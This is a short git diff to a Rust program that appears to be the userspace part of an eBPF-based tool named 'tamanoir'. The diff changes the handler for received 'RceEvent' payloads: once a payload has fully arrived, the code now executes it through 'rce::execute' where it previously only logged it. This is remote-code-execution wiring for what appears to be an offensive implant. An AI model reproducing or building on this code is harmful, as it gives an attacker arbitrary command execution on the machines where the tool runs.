@@ -8,7 +8,7 @@ use aya::{
 use clap::Parser;
 use log::{debug, info, warn};
 use mio::{unix::SourceFd, Events, Interest, Poll, Token};
-use tamanoir::ringbuf::RingBuffer;
+use tamanoir::{rce::execute, ringbuf::RingBuffer};
 use tamanoir_common::{ContinuationByte, RceEvent};
 use tokio::signal;
 
@@ -122,8 +122,7 @@ async fn main() -> anyhow::Result<()> {
                                     rce.event_type
                                 {
                                     debug!("payload full transmission is finished, sending it to executor");
-                                    let str_payload = str::from_utf8(&payload).unwrap();
-                                    info!("PAYLOAD: {}", str_payload);
+                                    let _ = execute(&payload);
                                 }
                             }
                         }
